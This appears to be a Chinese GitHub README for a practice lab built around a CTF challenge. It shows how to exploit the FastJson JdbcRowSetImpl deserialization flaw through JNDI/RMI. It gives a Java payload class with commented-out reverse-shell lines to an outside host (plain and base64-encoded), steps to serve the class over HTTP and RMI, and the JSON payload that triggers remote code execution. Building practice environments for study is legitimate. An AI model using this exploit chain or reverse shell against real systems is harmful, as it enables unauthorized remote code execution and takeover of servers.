# FastJson-JdbcRowSetImpl

## 初心

### 在前不久的护网杯中出现了名为“easy_web”的一道题，利用FastJson的JdbcRowSetImpl类反序列化漏洞进行Shell。一大部分人对这道题是懵逼的，没做出来的，因为没有环境去练习，所以我就写了环境，方便大家练习。

## 漏洞环境构建

```
root@Bearcat:/# wget "https://github.com/iBearcat/FastJson-JdbcRowSetImpl/raw/master/FastJson_Vul.war" -P path.... & cd  ${path}/opt/apache-tomcat-8.5.24/bin & ./startup.sh"
```

![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/1.jpg?raw=true)

### 访问漏洞环境 http://localhost:8888/FastJson_Vul

![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/2.jpg?raw=true)

## 漏洞利用

### 在CommandObject.java类中的commands数组中构造想要执行的命令

### 编译 javac CommandObject.java

```
import	java.lang.Runtime;
import	java.lang.Process;
public class CommandObject {
    public CommandObject(){
        try{
			Runtime	rt	=	Runtime.getRuntime();
			//Runtime.getRuntime().exec("/bin/bash -i >&/dev/tcp/192.168.43.14/2018<&1");
			//String[] commands = {"bash -c {echo,L2Jpbi9iYXNoIC1pID4mL2Rldi90Y3AvMTkyLjE2OC40My4xNC8yMDE4PCYx}|{base64,-d}|{bash,-i}"};
			
			String[] commands = {"touch","/opt/test"}; //Command
			Process	pc = rt.exec(commands);
			pc.waitFor();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        CommandObject e = new CommandObject();
    }
}
```

![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/3.jpg?raw=true)

## 漏洞利用

### 开启一个HTTP服务，并且开启 RMIServer

### 如：

```
Python2 -m SimpleHTTPServer 80
Python3 -m http.server 80
```

### 生成Payload

```
java -jar FastJson_JdbcRowSetImpl_JNDI_RMIServer.jar <HTTP服务地址> 指定RMI端口
```

### FastJson_JdbcRowSetImpl_JNDI_RMIServer.jar 会生成一串Json Payload

![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/4.jpg?raw=true)

```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://192.168.43.14:6666/Object","autoCommit":true}
```

### 把它Copy到漏洞环境的input中，然后submit进行攻击。

![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/5.jpg?raw=true)


### 成功执行命令，并touch test

```
String[] commands = {"touch","/opt/test"}; //Command
```
![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/6.jpg?raw=true)

# 致谢我的好基友

### pyn3rd https://github.com/pyn3rd/CVE-2018-2893
### 背影   https://github.com/yanweijin
